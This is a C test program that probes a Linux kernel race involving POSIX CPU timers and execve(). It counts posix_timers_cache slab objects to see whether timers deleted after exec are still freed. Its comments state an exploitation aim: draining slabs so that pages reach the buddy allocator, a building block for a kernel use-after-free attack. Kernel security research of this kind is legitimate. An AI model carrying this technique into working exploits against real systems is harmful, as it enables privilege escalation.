/*
 * freetest.c - after a non-leader execve() has completed, does a timer_delete()
 * on the (now stale) signal_struct still free the k_itimer object?
 *
 * This is the crux of combining the two race shapes:
 *   - victim-side deleters give the wide race window (proven to produce
 *     dangling nodes: +84 persistent leak per 320 execs), but execve zaps them
 *     so leftovers keep their slabs pinned and no page can reach the buddy
 *     allocator;
 *   - parent-side deleters survive execve and complete, but on their own they
 *     never hit the race.
 * If a post-exec delete still frees the object, the parent can mop up whatever
 * the victim's deleters left behind and the slabs can drain.
 *
 * usage: freetest <ntimers> [delay_ms_after_exec]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CPUCLOCK_SCHED 2

static void slab(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];
    printf("--- %s\n", tag);
    if (!f) { printf("    unreadable\n"); return; }
    while (fgets(line, sizeof line, f))
        if (!strncmp(line, "posix_timers_cache ", 19))
            printf("    %s", line);
    fclose(f);
}

struct execarg { int dummy; };

static void *exec_thread(void *a)
{
    (void)a;
    char *const av[] = { (char *)"/proc/self/exe", (char *)"--child", NULL };
    char *const ep[] = { NULL };
    execve(av[0], av, ep);
    _exit(7);
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--child")) {
        signal(SIGUSR1, SIG_IGN);
        usleep(4000 * 1000);          /* stay alive so the parent can measure */
        _exit(0);
    }

    int N = argc > 1 ? atoi(argv[1]) : 1000;
    int delay = argc > 2 ? atoi(argv[2]) : 500;
    signal(SIGUSR1, SIG_IGN);

    slab("baseline");

    pid_t v = fork();
    if (v == 0) {
        /* child: non-leader thread execs, main thread pauses */
        signal(SIGUSR1, SIG_IGN);
        pthread_t th;
        struct execarg ea = { 0 };
        pthread_create(&th, NULL, exec_thread, &ea);
        for (;;) pause();
    }

    /* parent creates the timers on the child's cpu clock */
    clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
    int *ids = calloc(N, sizeof(int));
    int made = 0;
    for (; made < N; made++) {
        struct sigevent ev;
        struct itimerspec its;
        int id = -1;
        memset(&ev, 0, sizeof ev);
        ev.sigev_notify = SIGEV_SIGNAL;
        ev.sigev_signo = SIGUSR1;
        if (syscall(107 /*timer_create*/, cid, &ev, &id) != 0) break;
        memset(&its, 0, sizeof its);
        its.it_value.tv_sec = 3600;
        if (syscall(110 /*timer_settime*/, id, 0, &its, NULL) != 0) break;
        ids[made] = id;
    }
    printf("created %d timers on child %d\n", made, (int)v);
    slab("after create");

    usleep(delay * 1000);            /* let the child's execve finish */

    int ok = 0, fail = 0;
    for (int i = 0; i < made; i++) {
        if (syscall(111 /*timer_delete*/, ids[i]) == 0) ok++;
        else fail++;
    }
    printf("post-exec deletes: ok=%d fail=%d\n", ok, fail);
    slab("after post-exec deletes");

    usleep(1500 * 1000);
    slab("1.5s later");

    kill(v, SIGKILL);
    usleep(500 * 1000);
    slab("after child exit");
    return 0;
}
